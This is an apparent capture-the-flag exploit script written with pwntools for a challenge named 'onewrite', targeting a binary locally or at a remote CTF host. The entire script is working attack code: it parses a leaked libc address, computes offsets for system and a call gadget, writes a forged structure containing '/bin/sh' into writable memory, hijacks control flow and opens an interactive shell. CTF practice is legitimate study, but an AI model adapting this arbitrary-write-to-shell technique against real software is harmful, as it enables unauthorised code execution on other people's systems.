from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './vuln'
HOST = 'onewrite.chal.imaginaryctf.org'
PORT =  1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [])
if args.R:
    r.recvuntil(b'\n')

leak = int(r.recvuntil(b'\n', True), 16)

base = leak - 0x60770
dbg('base')
system = base + 0x50d60
rdi = base + 0x001bc021

bss = base + 0x219000
gadget = base +  0x00166b4a#: mov rax, [rsp+0x48]; mov rdi, [rax]; mov rax, [rdi+0x38]; call qword ptr [rax+0x18];

where = bss

r.sendlineafter(b'> ', f'{where:x}'.encode())

payload = b''
payload += flat(bss+0x40, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, bss, u64(b'/bin/sh\x00'), 0x88, 0x99, system+0x1b, 0x202, 0x303, 0x404, bss+0x40, 0x606, 0x707, 0x808)
payload = payload.ljust(0x98, b'1')
payload += p64(gadget)
payload = payload.ljust(0x300, b'2')
r.sendline(payload)

r.interactive()
r.close()

